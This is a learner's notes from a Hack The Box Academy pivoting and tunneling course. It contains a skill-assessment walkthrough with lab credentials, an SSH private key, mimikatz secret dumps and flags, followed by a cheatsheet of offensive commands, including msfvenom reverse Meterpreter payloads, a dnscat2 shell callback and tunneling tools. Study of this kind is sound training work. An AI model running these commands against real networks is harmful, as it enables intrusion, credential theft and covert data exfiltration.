ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server. [ptunnel-ng](https://github.com/utoni/ptunnel-ng) is a great tool that allows us to do this.

### Skill Assessment

IP: 10.129.208.79

```sh
www-data@inlanefreight.local:…/www/html# ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.208.79  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:e9df  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:e9df  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:e9:df  txqueuelen 1000  (Ethernet)
        RX packets 1531  bytes 137646 (137.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 588  bytes 77641 (77.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb9:b964  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:b9:64  txqueuelen 1000  (Ethernet)
        RX packets 332  bytes 21095 (21.0 KB)
        RX errors 0  dropped 13  overruns 0  frame 0
        TX packets 13  bytes 1006 (1.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1742  bytes 136860 (136.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1742  bytes 136860 (136.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


www-data@inlanefreight.local:…/www/html# netstat -antp
(No info could be read for "-p": geteuid()=33 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      1 10.129.208.79:34878     1.1.1.1:53              SYN_SENT    -
tcp        0      1 10.129.208.79:49512     8.8.8.8:53              SYN_SENT    -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 10.129.208.79:80        10.10.14.247:53140      TIME_WAIT   -
tcp6       0      0 10.129.208.79:80        10.10.14.247:37476      ESTABLISHED -


www-data@inlanefreight.local:/home/webadmin# cat for-admin-eyes-only
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!

www-data@inlanefreight.local:/home/webadmin# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```sh
┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
└──╼ [★]$ ssh webadmin@10.129.208.79 -i www.rsa
```

```sh
webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.026 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.533 ms
```

```sh
┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
└──╼ [★]$ sudo sshuttle -r webadmin@10.129.208.79 172.16.5.0/23 -v --ssh-cmd 'ssh -i www.rsa'

┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
└──╼ [★]$ ssh mlefay@172.16.5.35
The authenticity of host '172.16.5.35 (172.16.5.35)' can't be established.
ECDSA key fingerprint is SHA256:eLsiZMYLSL7ZU18y5e5UweyshW/D9MJ2Rq4XuUqO/wc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.5.35' (ECDSA) to the list of known hosts.
mlefay@172.16.5.35's password: Plain Human work!

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

mlefay@PIVOT-SRV01 C:\Users\mlefay> exit

┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-gxwarb3erc]─[~]
└──╼ [★]$ scp mimikatz.exe mlefay@172.16.5.35:"C:\\Users\\mlefay\\"
mlefay@172.16.5.35's password: Plain Human work!
mimikatz.exe                                                  100% 1324KB   7.1MB/s   00:00
```

```cmd
mlefay@PIVOT-SRV01 C:\Users\mlefay>type C:\Flag.txt
S1ngl3-Piv07-3@sy-Day

mlefay@PIVOT-SRV01 C:\Users\mlefay>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::f084:7265:ec5f:bebe%4
   IPv4 Address. . . . . . . . . . . : 172.16.5.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.5.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5d78:ecf:b016:4434%5
   IPv4 Address. . . . . . . . . . . : 172.16.6.35
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :


mlefay@PIVOT-SRV01 C:\Users\mlefay>mimikatz.exe

mimikatz # lsadump::secrets
Domain : PIVOT-SRV01
SysKey : eeefe7d6277a2ae258b4e571104cc289

Local name : PIVOT-SRV01 ( S-1-5-21-1602415334-2376822715-119304339 )
Domain name : INLANEFREIGHT ( S-1-5-21-3858284412-1730064152-742000644 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {a4bf8c79-68b8-b086-46df-dc85da69e0c8}
  [00] {a4bf8c79-68b8-b086-46df-dc85da69e0c8} 39e6b5c93fa7690b499f6e6119a904d2bff37d9ed24d0b61bee460c1a7bd031d


Secret  : $MACHINE.ACC
cur/text: z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;
Is4= 1GOR+3h<U/a[Q7#
    NTLM:21ce18b1a025d4b0b01c0e716e99d476
    SHA1:0f6097d8c745b1addfdfbbe733c1948e5d929527
old/text: z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9\<$VDLWL+UL4KDZ&lh^Z_[OEj;
Is4= 1GOR+3h<U/a[Q7#
    NTLM:21ce18b1a025d4b0b01c0e716e99d476
    SHA1:0f6097d8c745b1addfdfbbe733c1948e5d929527

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 2c 1b ed 0e 34 6a f0 6d 64 c3 2d cf d1 08 d8 fb 3a f1 e3 53 8a 88 8d cf 7b ec c6 9d 40 6
5 ca f2 6b 6a 53 4a b1 60 14 4c
    full: 2c1bed0e346af06d64c32dcfd108d8fb3af1e3538a888dcf7becc69d4065caf26b6a534ab160144c
    m/u : 2c1bed0e346af06d64c32dcfd108d8fb3af1e353 / 8a888dcf7becc69d4065caf26b6a534ab160144c
old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8
a c6 07 10 78 7c 0d 9a 56 ce 0b
    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b

Secret  : NL$KM
cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 6
4 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 6
4 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63

Secret  : _SC_DHCPServer / service 'DHCPServer' with username : INLANEFREIGHT\vfrank
cur/text: Imply wet Unmasked!
old/text: Imply wet Unmasked!

Secret  : _SC_SCardSvr / service 'SCardSvr' with username : INLANEFREIGHT\vfrank
cur/text: Imply wet Unmasked!



mimikatz #exit

mlefay@PIVOT-SRV01 C:\Users\mlefay>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
...
SNIP
...
mlefay@PIVOT-SRV01 C:\Users\mlefay>ping 172.16.6.35 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128
```

172.16.5.35 - C:\\Flag.txt: `S1ngl3-Piv07-3@sy-Day`

Found: `INLANEFREIGHT\vfrank:Imply wet Unmasked!` and the IP `172.16.6.35`

```console
C:\Users\vfrank>for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
...
C:\Users\vfrank>ping 172.16.6.25 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.25: bytes=32 time<1ms TTL=128
...
C:\Users\vfrank>ping 172.16.6.35 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128
...
C:\Users\vfrank>ping 172.16.6.45 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.45: bytes=32 time=1ms TTL=64
```

```sh
┌─[us-academy-2]─[10.10.14.247]─[htb-ac-713396@htb-zjez6mclrz]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.6.25 /u:"INLANEFREIGHT\vfrank" /p:"Imply wet Unmasked!"
```

```console
C:\Users\vfrank>type C:\\Flag.txt
N3tw0rk-H0pp1ng-f0R-FuN



C:\Users\vfrank>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::d05f:823d:172b:595%9
   IPv4 Address. . . . . . . . . . . : 172.16.6.25
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::cd46:a4fe:f119:c745%4
   IPv4 Address. . . . . . . . . . . : 172.16.10.25
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :


C:\Users\vfrank>for /L %i in (1 1 254) do ping 172.16.10.%i -n 1 -w 100 | find "Reply"
...
C:\Users\vfrank>ping 172.16.10.5 -n 1 -w 100   | find "Reply"
Reply from 172.16.10.5: bytes=32 time<1ms TTL=128
```

172.16.6.25 - C:\\Flag.txt: `N3tw0rk-H0pp1ng-f0R-FuN`

### Cheatsheet

| Command                                                                                                                                                                                                            | Description                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ifconfig`                                                                                                                                                                                                         | Linux-based command that displays all current network configurations of a system.                                                                                                                                                                                       |
| `ipconfig`                                                                                                                                                                                                         | Windows-based command that displays all system network configurations.                                                                                                                                                                                                  |
| `netstat -r`                                                                                                                                                                                                       | Command used to display the routing table for all IPv4-based protocols.                                                                                                                                                                                                 |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                                                                                                                                                                           | Nmap command used to scan a target for open ports allowing SSH or MySQL connections.                                                                                                                                                                                    |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`                                                                                                                                                            | SSH comand used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.                                                                                                                                                     |
| `netstat -antp \| grep 1234`                                                                                                                                                                                       | Netstat option used to display network connections associated with a tunnel created. Using grep to filter based on local port 1234.                                                                                                                                     |
| `nmap -v -sV -p1234 localhost`                                                                                                                                                                                     | Nmap command used to scan a host through a connection that has been made on local port 1234.                                                                                                                                                                            |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`                                                                                                                                          | SSH command that instructs the ssh client to request the SSH server forward all data via port 1234 to localhost:3306.                                                                                                                                                   |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                           | SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.                                                                                                                |
| `tail -4 /etc/proxychains.conf`                                                                                                                                                                                    | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.                                                                                                                                 |
| `proxychains nmap -v -sn 172.16.5.1-200`                                                                                                                                                                           | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range 172.16.5.1-200 with increased verbosity (-v) disabling ping scan (-sn).                                                |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                                                                                                                                                                          | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (-v), disabling ping discover (-Pn), and using TCP connect scan type (-sT).                                        |
| `proxychains msfconsole`                                                                                                                                                                                           | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.                                                                                                                                                                       |
| `msf6 > search rdp_scanner`                                                                                                                                                                                        | Metasploit search that attempts to find a module called rdp\*scanner.                                                                                                                                                                                                   |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`                                                                                                                                                | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.                                                                                                                                     |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`                                                                                            | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following lhost= on local port 8080 (LPORT=8080). Payload will take the form of an executable file called backupscript.exe.          |
| `msf6 > use exploit/multi/handler`                                                                                                                                                                                 | Used to select the multi-handler exploit module in Metasploit.                                                                                                                                                                                                          |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`                                                                                                                                                               | Uses secure copy protocol (scp) to transfer the file backupscript.exe to the specified host and places it in the Ubuntu user's home directory (:~/).                                                                                                                    |
| `python3 -m http.server 8123`                                                                                                                                                                                      | Uses Python3 to start a simple HTTP server listening on port 8123. Can be used to retrieve files from a host.                                                                                                                                                           |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`                                                                                                                | PowerShell command used to download a file called backupscript.exe from a webserver (172.16.5.129:8123) and then save the file to location specified after -OutFile.                                                                                                    |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN`                                                                                                                                    | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target.                                                                                                         |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080`                                                                                                        | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after LHOST= on port 8080 (LPORT=8080). Payload takes the form of an executable elf file called backupjob.                                                   |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`                                                                                                                                                      | Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23).                                                                                                                                                          |
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done`                                                                                                                                       | For Loop used on a Linux-based system to discover devices in a specified network segment.                                                                                                                                                                               |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"`                                                                                                                                           | For Loop used on a Windows-based system to discover devices in a specified network segment.                                                                                                                                                                             |
| `1..254 \| % {"172.16.5.$($*): $(Test-Connection -count 1 -comp 172.15.5.$($\_) -quiet)"}`                                                                                                                         | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.                                                                                                                                                                                   |
| `msf6 > use auxiliary/server socks_proxy`                                                                                                                                                                          | Metasploit command that selects the socks_proxy auxiliary module.                                                                                                                                                                                                       |
| `msf6 auxiliary(server/socks_proxy) > jobs`                                                                                                                                                                        | Metasploit command that lists all currently running jobs.                                                                                                                                                                                                               |
| `socks4 127.0.0.1 9050`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |
| `Socks5 127.0.0.1 1080`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used                                                                                                                                                                    |
| `msf6 > use post/multi/manage/autoroute`                                                                                                                                                                           | Metasploit command used to select the autoroute module.                                                                                                                                                                                                                 |
| `meterpreter > help portfwd`                                                                                                                                                                                       | Meterpreter command used to display the features of the portfwd command.                                                                                                                                                                                                |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`                                                                                                                                                 | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.                                                                |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`                                                                                                                                                                 | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.                                                                                                          |
| `netstat -antp`                                                                                                                                                                                                    | Used to display all (-a) active network connections with associated process IDs. -t displays only TCP connections.-n displays only numerical addresses. -p displays process IDs associated with each displayed connection.                                              |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>`                                                                                                                                          | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port 1234 listening on the IP address of the Attack Host.                                                                                              |
| `meterpreter > bg`                                                                                                                                                                                                 | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux                                                                                                                                       |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`                                                                                                                                                      | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.                                                                                                                                 |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`                                                                                                                                                        | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.                                                                                                                               |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                         | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
| `sudo apt-get install sshuttle`                                                                                                                                                                                    | Uses apt-get to install the tool sshuttle.                                                                                                                                                                                                                              |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`                                                                                                                                                              | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0).                                                                                       |
| `sudo git clone https://github.com/klsecservices/rpivot.git`                                                                                                                                                       | Clones the rpivot project GitHub repository.                                                                                                                                                                                                                            |
| `sudo apt-get install python2.7`                                                                                                                                                                                   | Uses apt-get to install python2.7.                                                                                                                                                                                                                                      |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`                                                                                                                                     | Used to run the rpivot server (server.py) on proxy port 9050, server port 9999 and listening on any IP address (0.0.0.0).                                                                                                                                               |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                                                                                                                                                                         | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.                                                                                                                                                                |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`                                                                                                                                                   | Used to run the rpivot client (client.py) to connect to the specified rpivot server on the appropriate port.                                                                                                                                                            |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`                                                                                                                                                          | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.                                                                                                                                          |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.                                                                                                                                                              |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`                                                                                 | Windows-based command that uses netsh.exe to configure a portproxy rule called v4tov4 that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.                                                                                   |
| `netsh.exe interface portproxy show v4tov4`                                                                                                                                                                        | Windows-based command used to view the configurations of a portproxy rule called v4tov4.                                                                                                                                                                                |
| `git clone https://github.com/iagox86/dnscat2.git`                                                                                                                                                                 | Clones the dnscat2 project GitHub repository.                                                                                                                                                                                                                           |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`                                                                                                                        | Used to start the dnscat2.rb server running on the specified IP address, port (53) & using the domain inlanefreight.local with the no-cache option enabled.                                                                                                             |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git`                                                                                                                                                  | Clones the dnscat2-powershell project Github repository.                                                                                                                                                                                                                |
| `Import-Module dnscat2.ps1`                                                                                                                                                                                        | PowerShell command used to import the dnscat2.ps1 tool.                                                                                                                                                                                                                 |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`                                                                                     | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (-Exec cmd).                                                                          |
| `dnscat2> ?`                                                                                                                                                                                                       | Used to list dnscat2 options.                                                                                                                                                                                                                                           |
| `dnscat2> window -i 1`                                                                                                                                                                                             | Used to interact with an established dnscat2 session.                                                                                                                                                                                                                   |
| `./chisel server -v -p 1234 --socks5`                                                                                                                                                                              | Used to start a chisel server in verbose mode listening on port 1234 using SOCKS version 5.                                                                                                                                                                             |
| `./chisel client -v 10.129.202.64:1234 socks`                                                                                                                                                                      | Used to connect to a chisel server at the specified IP address & port using socks                                                                                                                                                                                       |
| `git clone https://github.com/utoni/ptunnel-ng.git`                                                                                                                                                                | Clones the ptunnel-ng project GitHub repository.                                                                                                                                                                                                                        |
| `sudo ./autogen.sh`                                                                                                                                                                                                | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.                                                                                                                                                                                 |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                                                                                                                                                                           | Used to start the ptunnel-ng server on the specified IP address (-r) and corresponding port (-R22).                                                                                                                                                                     |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`                                                                                                                                                    | Used to connect to a specified ptunnel-ng server through local port 2222 (-l2222).                                                                                                                                                                                      |
| `ssh -p2222 -lubuntu 127.0.0.1`                                                                                                                                                                                    | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.                                                                                                                                       |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                                                                                                                                                                             | Windows-based command used to register the SocksOverRDP-PLugin.dll.                                                                                                                                                                                                     |
| `netstat -antb \| findstr 1080`                                                                                                                                                                                    | Windows-based command used to list TCP network connections listening on port 1080.                                                                                                                                                                                      |

### Completion

[Link of Completion](https://academy.hackthebox.com/achievement/713396/158)

## Active Directory Enumeration & Attacks

### Scenario

**In Scope**
| Range/Domain | Description |
| ------------------------------- | ----------------------------------------------------------------------------------------- |
| `INLANEFREIGHT.LOCAL` | Customer domain to include AD and web services. |
| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain |
| `FREIGHTLOGISTICS.LOCAL` | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| `172.16.5.0/23` | In-scope internal subnet. |

**Out of Scope**

- Any other subdomains of INLANEFREIGHT.LOCAL
- Any subdomains of FREIGHTLOGISTICS.LOCAL
- Any phishing or social engineering attacks
- Any other IPS/domains/subdomains not explicitly mentioned
- Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module

### External Recon and Enumeration Principles

